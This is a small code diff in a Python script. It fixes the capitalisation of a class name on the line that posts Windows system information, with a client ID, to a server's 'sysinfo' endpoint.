@@ -45,7 +45,7 @@ def main():
             elif platform == "darwin": # OS X
                 pass
             elif platform == "win32": # Windows
-                response = requests.post(SERVER_URL + "sysinfo",data={'id': MY_ID, 'info': Information.win32.getInfo()})
+                response = requests.post(SERVER_URL + "sysinfo",data={'id': MY_ID, 'info': Information.Win32.getInfo()})
                 print(response)
 
 
